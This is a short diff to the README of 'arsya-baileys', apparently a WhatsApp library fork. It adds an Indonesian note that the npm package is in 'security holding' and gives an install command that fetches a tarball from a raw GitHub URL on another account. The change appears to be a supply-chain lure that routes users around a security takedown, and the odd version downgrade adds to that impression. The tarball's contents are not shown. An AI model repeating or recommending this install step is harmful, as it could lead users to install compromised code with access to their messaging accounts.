@@ -18,7 +18,9 @@ Ships compiled runtime files in `lib/` and protobuf artifacts in `WAProto/`, int
 
 ---
 
-## 🆕 Changelog / Updates (v9.2.4 — arsya-baileys)
+## 🆕 Changelog / Updates (v1.0.4 — arsya-baileys)
+
+> **Distribusi:** sejak 9 Okt 2026 nama `arsya-baileys` di npm ditarik (security holding) — instal via GitHub: `npm i https://raw.githubusercontent.com/ziole-visa/arsya-baileys/main/dist/arsya-baileys-1.0.4.tgz`
 
 **Security**
 
